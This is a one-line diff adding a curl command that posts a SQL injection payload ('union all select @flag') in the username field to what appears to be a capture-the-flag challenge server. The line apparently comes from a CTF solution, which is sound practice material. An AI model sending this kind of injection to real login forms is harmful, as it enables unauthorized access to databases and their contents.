@@ -1,0 +1,1 @@
+$ curl --data "username=x' union all select @flag,1 #" -i http://0491e9f58d3c2196a6e1943adef9a9ab734ff5c9.ctf.site:20000/
